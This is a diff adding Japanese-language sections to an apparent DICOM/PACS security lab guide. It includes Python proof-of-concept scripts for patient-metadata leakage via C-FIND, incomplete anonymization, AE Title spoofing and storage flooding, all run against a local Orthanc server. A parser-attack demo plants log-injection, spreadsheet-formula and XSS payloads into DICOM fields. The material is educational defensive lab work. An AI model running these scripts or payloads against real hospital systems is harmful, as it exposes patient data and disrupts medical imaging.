@@ -577,11 +577,418 @@ if __name__ == "__main__":
     main()
 ```
 
-### 1. メタデータ検査による平文通信の危険性PoC
+### 1. メタデータ検査
+DICOMファイルに含まれるメタデータを確認する。
+```bash
+$ python scripts/inspect_metadata.py data/generated/sample.dcm
+```
+```python inspect_metadata.py
+import argparse
 
-### 5
-### 6
-### 7
+import pydicom
+
+
+SENSITIVE_KEYWORDS = [
+    "Patient",
+    "Physician",
+    "Institution",
+    "Referring",
+    "Operator",
+    "Station",
+    "Device",
+    "Accession",
+]
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser()
+    parser.add_argument("dicom_file")
+    args = parser.parse_args()
+
+    ds = pydicom.dcmread(args.dicom_file, stop_before_pixels=True)
+
+    for elem in ds.iterall():
+        keyword = elem.keyword or ""
+        name = elem.name or ""
+
+        if any(token in keyword or token in name for token in SENSITIVE_KEYWORDS):
+            print(f"{elem.tag} {keyword}: {elem.value}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 2. C-FINDによるmetadata leakage
+`C-FIND`を使ってPACS内の検査情報を検索する。
+```bash
+python scripts/c_find.py
+```
+```python c_find.py
+from pynetdicom import AE
+from pynetdicom.sop_class import StudyRootQueryRetrieveInformationModelFind
+from pydicom.dataset import Dataset
+
+
+PACS_HOST = "127.0.0.1"
+PACS_PORT = 4242
+PACS_AET = "ORTHANC"
+CALLING_AET = "LABCLIENT"
+
+
+def main() -> None:
+    ae = AE(ae_title=CALLING_AET)
+    ae.add_requested_context(StudyRootQueryRetrieveInformationModelFind)
+
+    assoc = ae.associate(PACS_HOST, PACS_PORT, ae_title=PACS_AET)
+
+    if not assoc.is_established:
+        print("Association failed")
+        return
+
+    query = Dataset()
+    query.QueryRetrieveLevel = "STUDY"
+    query.PatientName = "*"
+    query.PatientID = ""
+    query.StudyDate = ""
+    query.StudyDescription = ""
+    query.Modality = ""
+    query.StudyInstanceUID = ""
+
+    responses = assoc.send_c_find(
+        query,
+        StudyRootQueryRetrieveInformationModelFind,
+    )
+
+    for status, identifier in responses:
+        if status is None:
+            print("Connection timed out or invalid response")
+            continue
+
+        print(f"Status: 0x{status.Status:04X}")
+
+        if identifier:
+            print("---- Result ----")
+            print(f"PatientName: {getattr(identifier, 'PatientName', '')}")
+            print(f"PatientID: {getattr(identifier, 'PatientID', '')}")
+            print(f"StudyDate: {getattr(identifier, 'StudyDate', '')}")
+            print(f"Modality: {getattr(identifier, 'Modality', '')}")
+            print(f"StudyDescription: {getattr(identifier, 'StudyDescription', '')}")
+            print(f"StudyInstanceUID: {getattr(identifier, 'StudyInstanceUID', '')}")
+
+    assoc.release()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 3. 匿名化不備
+匿名化の不十分なメタデータを推測する。
+```bash
+python scripts/anonymize_incomplete_demo.py data/generated/sample.dcm data/generated/anon_incomplete.dcm
+python scripts/inspect_metadata.py data/generated/anon_incomplete.dcm
+```
+```python anonymize_incomplete_demo.py
+import argparse
+from pathlib import Path
+
+import pydicom
+
+
+def incomplete_anonymize(input_path: Path, output_path: Path) -> None:
+    ds = pydicom.dcmread(input_path)
+
+    if "PatientName" in ds:
+        ds.PatientName = "ANONYMIZED"
+
+    if "PatientID" in ds:
+        ds.PatientID = "ANONYMIZED"
+
+    ds.save_as(output_path, write_like_original=False)
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser()
+    parser.add_argument("input_file")
+    parser.add_argument("output_file")
+    args = parser.parse_args()
+
+    incomplete_anonymize(
+        Path(args.input_file),
+        Path(args.output_file),
+    )
+
+    print(f"Saved: {args.output_file}")
+    print("Warning: this is intentionally incomplete anonymization")
+
+
+if __name__ == "__main__":
+    main()
+```
+匿名化では、DICOM PS3.15 の de-identification profile、Private Tag処理、UID再生成、画像内焼き込み文字検査を含めて設計する必要がある。
+
+### 4. AE Title spoofingのPoC
+Calling AE Titleを任意に変更してC-ECHOを送る。
+```bash
+python scripts/ae_title_spoof_lab.py --calling-aet CT_ROOM_01
+python scripts/ae_title_spoof_lab.py --calling-aet MRI_ROOM_02
+python scripts/ae_title_spoof_lab.py --calling-aet ANY_AE_TITLE
+```
+```python ae_title_spoof_lab.py
+import argparse
+
+from pynetdicom import AE
+from pynetdicom.sop_class import Verification
+
+
+PACS_HOST = "127.0.0.1"
+PACS_PORT = 4242
+PACS_AET = "ORTHANC"
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "--calling-aet",
+        default="CT_ROOM_01",
+        help="Calling AE Title to present to the PACS",
+    )
+    args = parser.parse_args()
+
+    ae = AE(ae_title=args.calling_aet)
+    ae.add_requested_context(Verification)
+
+    assoc = ae.associate(PACS_HOST, PACS_PORT, ae_title=PACS_AET)
+
+    if not assoc.is_established:
+        print("Association failed")
+        return
+
+    status = assoc.send_c_echo()
+
+    if status:
+        print(f"Calling AE Title: {args.calling_aet}")
+        print(f"C-ECHO status: 0x{status.Status:04X}")
+    else:
+        print("C-ECHO failed")
+
+    assoc.release()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 5. storage abuseのPoC
+DICOMを連続送信し、PACSが受信・保存する挙動を確認する。
+```bash
+python scripts/storage_abuse_lab.py --count 20
+```
+```python storage_abuse_lab.py
+import argparse
+from pathlib import Path
+from datetime import datetime
+
+import numpy as np
+import pydicom
+from pydicom.dataset import Dataset, FileDataset
+from pydicom.uid import (
+    ExplicitVRLittleEndian,
+    SecondaryCaptureImageStorage,
+    generate_uid,
+)
+from pynetdicom import AE
+from pynetdicom.sop_class import SecondaryCaptureImageStorage as SC_STORAGE
+
+
+PACS_HOST = "127.0.0.1"
+PACS_PORT = 4242
+PACS_AET = "ORTHANC"
+CALLING_AET = "LABCLIENT"
+
+
+def build_dicom(index: int, rows: int, columns: int) -> FileDataset:
+    file_meta = Dataset()
+    file_meta.MediaStorageSOPClassUID = SecondaryCaptureImageStorage
+    file_meta.MediaStorageSOPInstanceUID = generate_uid()
+    file_meta.TransferSyntaxUID = ExplicitVRLittleEndian
+    file_meta.ImplementationClassUID = generate_uid()
+
+    ds = FileDataset(
+        None,
+        {},
+        file_meta=file_meta,
+        preamble=b"\0" * 128,
+    )
+
+    now = datetime.now()
+
+    ds.PatientName = f"LOADTEST^{index:04d}"
+    ds.PatientID = f"LOAD-{index:04d}"
+    ds.StudyDate = now.strftime("%Y%m%d")
+    ds.StudyTime = now.strftime("%H%M%S")
+    ds.Modality = "OT"
+    ds.StudyDescription = "LAB STORAGE LOAD TEST"
+    ds.SeriesDescription = "Small generated images"
+    ds.InstitutionName = "DICOM Cybersecurity Lab"
+
+    ds.StudyInstanceUID = generate_uid()
+    ds.SeriesInstanceUID = generate_uid()
+    ds.SOPClassUID = SecondaryCaptureImageStorage
+    ds.SOPInstanceUID = file_meta.MediaStorageSOPInstanceUID
+
+    ds.SamplesPerPixel = 1
+    ds.PhotometricInterpretation = "MONOCHROME2"
+    ds.Rows = rows
+    ds.Columns = columns
+    ds.BitsAllocated = 8
+    ds.BitsStored = 8
+    ds.HighBit = 7
+    ds.PixelRepresentation = 0
+
+    pixel_array = np.zeros((rows, columns), dtype=np.uint8)
+    pixel_array[:, :] = index % 256
+    ds.PixelData = pixel_array.tobytes()
+
+    return ds
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--count", type=int, default=10)
+    parser.add_argument("--rows", type=int, default=64)
+    parser.add_argument("--columns", type=int, default=64)
+    args = parser.parse_args()
+
+    if args.count > 100:
+        raise ValueError("Safety limit: --count must be 100 or less")
+
+    if args.rows * args.columns > 512 * 512:
+        raise ValueError("Safety limit: image size must be 512x512 or less")
+
+    ae = AE(ae_title=CALLING_AET)
+    ae.add_requested_context(SC_STORAGE)
+
+    assoc = ae.associate(PACS_HOST, PACS_PORT, ae_title=PACS_AET)
+
+    if not assoc.is_established:
+        print("Association failed")
+        return
+
+    for index in range(args.count):
+        ds = build_dicom(index=index, rows=args.rows, columns=args.columns)
+        status = assoc.send_c_store(ds)
+
+        if status:
+            print(f"[{index}] C-STORE status: 0x{status.Status:04X}")
+        else:
+            print(f"[{index}] C-STORE failed")
+
+    assoc.release()
+
+
+if __name__ == "__main__":
+    main()
+```
+### 6. malicious DICOM / parser attack
+DICOMメタデータが後段のログ、CSV、HTML、DB、ビューアに渡ることで二次的な問題を起こし得ることを確認する。
+```bash
+python scripts/parser_demo.py
+```
+```python parser_demo.py
+from pathlib import Path
+from datetime import datetime
+import csv
+
+import numpy as np
+from pydicom.dataset import Dataset, FileDataset
+from pydicom.uid import ExplicitVRLittleEndian, SecondaryCaptureImageStorage, generate_uid
+
+
+OUTPUT_DIR = Path("data/generated")
+OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
+
+
+def create_pathological_metadata_dicom(output_path: Path) -> None:
+    file_meta = Dataset()
+    file_meta.MediaStorageSOPClassUID = SecondaryCaptureImageStorage
+    file_meta.MediaStorageSOPInstanceUID = generate_uid()
+    file_meta.TransferSyntaxUID = ExplicitVRLittleEndian
+    file_meta.ImplementationClassUID = generate_uid()
+
+    ds = FileDataset(
+        str(output_path),
+        {},
+        file_meta=file_meta,
+        preamble=b"\0" * 128,
+    )
+
+    now = datetime.now()
+
+    ds.PatientName = "ATTACK^LOG\nInjected-Log-Line: false status"
+    ds.PatientID = "=HYPERLINK(\"http://example.invalid\",\"click\")"
+    ds.StudyDate = now.strftime("%Y%m%d")
+    ds.StudyTime = now.strftime("%H%M%S")
+    ds.Modality = "OT"
+    ds.StudyDescription = "<img src=x onerror=alert(1)>"
+    ds.InstitutionName = "DICOM Parser Lab"
+    ds.AccessionNumber = "LAB-PARSER-0001"
+
+    ds.StudyInstanceUID = generate_uid()
+    ds.SeriesInstanceUID = generate_uid()
+    ds.SOPClassUID = SecondaryCaptureImageStorage
+    ds.SOPInstanceUID = file_meta.MediaStorageSOPInstanceUID
+
+    ds.SamplesPerPixel = 1
+    ds.PhotometricInterpretation = "MONOCHROME2"
+    ds.Rows = 64
+    ds.Columns = 64
+    ds.BitsAllocated = 8
+    ds.BitsStored = 8
+    ds.HighBit = 7
+    ds.PixelRepresentation = 0
+
+    pixel_array = np.zeros((64, 64), dtype=np.uint8)
+    pixel_array[8:56, 8:56] = 120
+    ds.PixelData = pixel_array.tobytes()
+
+    ds.save_as(output_path, write_like_original=False)
+
+
+def naive_export_to_csv(dicom_path: Path, csv_path: Path) -> None:
+    import pydicom
+
+    ds = pydicom.dcmread(dicom_path, stop_before_pixels=True)
+
+    rows = [
+        ["field", "value"],
+        ["PatientName", str(getattr(ds, "PatientName", ""))],
+        ["PatientID", str(getattr(ds, "PatientID", ""))],
+        ["StudyDescription", str(getattr(ds, "StudyDescription", ""))],
+        ["InstitutionName", str(getattr(ds, "InstitutionName", ""))],
+    ]
+
+    with csv_path.open("w", newline="", encoding="utf-8") as f:
+        writer = csv.writer(f)
+        writer.writerows(rows)
+
+
+def main() -> None:
+    dicom_path = OUTPUT_DIR / "pathological_metadata.dcm"
+    csv_path = OUTPUT_DIR / "naive_export.csv"
+
+    create_pathological_metadata_dicom(dicom_path)
+    naive_export_to_csv(dicom_path, csv_path)
+
+    print(f"Created DICOM: {dicom_path}")
+    print(f"Created CSV: {csv_path}")
+    print("Inspect the CSV as text before opening it in spreadsheet software.")
+
+
+if __name__ == "__main__":
+    main()
+```
 
 ## 6. 医療安全(patient safety, medical safety)への影響
 ## 7. 防御
